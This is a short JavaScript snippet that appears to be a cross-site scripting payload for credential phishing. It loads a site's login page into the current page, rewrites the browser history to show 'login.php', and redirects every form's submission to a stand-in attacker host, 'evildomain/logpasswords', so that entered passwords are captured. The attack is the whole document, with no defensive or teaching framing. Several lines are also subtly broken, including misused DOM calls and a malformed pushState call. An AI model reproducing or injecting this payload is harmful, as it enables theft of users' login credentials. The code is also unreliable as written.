function override(url){
  var req = new XMLHttpRequest();
  req.open('GET', url,false);
  req.onreadystatechange = function(){
    if(req.readyState == 4 && req.responseText != ""){
      document.innerHTML = req.responseText;
    }
  }
  req.send(null);
}

override("/login.php");

history.pushState({he: "he"}, document, getElementsByTagName("title")[0].innerHTML, "login.php");

var forms = document.getElementsByTagName("form");
for (index=0;index<forms.length;index++){
  void(forms[index].action = "http://evildomain/logpasswords");
}
